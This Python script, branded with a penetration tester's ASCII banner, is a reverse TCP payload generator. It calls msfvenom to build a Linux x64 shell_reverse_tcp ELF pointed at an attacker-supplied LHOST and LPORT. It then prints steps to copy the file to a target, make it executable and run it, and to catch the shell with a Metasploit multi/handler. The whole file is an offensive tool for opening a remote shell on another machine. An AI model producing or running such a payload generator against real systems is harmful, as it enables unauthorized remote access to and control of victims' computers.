import subprocess
import os
import sys

def validate_ip(ip):
    """Validate IP address format."""
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(part) <= 255 for part in parts)
    except ValueError:
        return False

def validate_port(port):
    """Validate port number."""
    try:
        port_num = int(port)
        return 1 <= port_num <= 65535
    except ValueError:
        return False

def generate_payload(lhost, lport, output_file="shell.elf"):
    """Generate reverse TCP payload using msfvenom."""
    payload = "linux/x64/shell_reverse_tcp"
    cmd = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        "-f", "elf",
        "-o", output_file
    ]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        print(f"[+] Payload generated successfully: {output_file}")
        print(f"[*] Transfer {output_file} to the target and run: chmod +x {output_file}; ./{output_file}")
        print(f"[*] Use msfconsole or a listener to catch the shell (e.g., msfconsole with multi/handler)")
    except subprocess.CalledProcessError as e:
        print(f"[!] Error generating payload: {e.stderr}")
        sys.exit(1)
    except FileNotFoundError:
        print("[!] msfvenom not found. Ensure Metasploit is installed and msfvenom is in PATH.")
        sys.exit(1)

def main():
    # Display ASCII art banner and info
    banner = """
    █████╗ ██╗     ██████╗  █████╗ ███╗   ██╗
   ██╔══██╗██║     ██╔══██╗██╔══██╗████╗  ██║
   ███████║██║     ██████╔╝███████║██╔██╗ ██║
   ██╔══██║██║     ██╔══██╗██╔══██║██║╚██╗██║
   ██║  ██║███████╗██████╔╝██║  ██║██║ ╚████║
   ╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
   ██████╗ ███████╗██╗     ██╗   ██╗██╗     ██╗
   ██╔══██╗██╔════╝██║     ██║   ██║██║     ██║
   ██████╔╝█████╗  ██║     ██║   ██║██║     ██║
   ██╔══██╗██╔══╝  ██║     ██║   ██║██║     ██║
   ██████╔╝███████╗███████╗╚██████╔╝███████╗██║
   ╚═════╝ ╚══════╝╚══════╝ ╚═════╝ ╚══════╝╚═╝

   [*] Penetration Tester
   [*] Bug Bounty Hunter
   [*] Security Researcher
   [*] beluli.mk
    """
    print(banner)
    print("[*] Reverse TCP Payload Generator")
    
    # Prompt for LHOST
    while True:
        lhost = input("[?] Enter LHOST (your attacking machine's IP): ").strip()
        if validate_ip(lhost):
            break
        print("[!] Invalid IP address. Please enter a valid IPv4 address (e.g., 192.168.1.100).")
    
    # Prompt for LPORT
    while True:
        lport = input("[?] Enter LPORT (e.g., 4444): ").strip()
        if validate_port(lport):
            break
        print("[!] Invalid port. Please enter a number between 1 and 65535.")
    
    # Generate payload
    output_file = "shell.elf"
    generate_payload(lhost, lport, output_file)

if __name__ == "__main__":
    main()
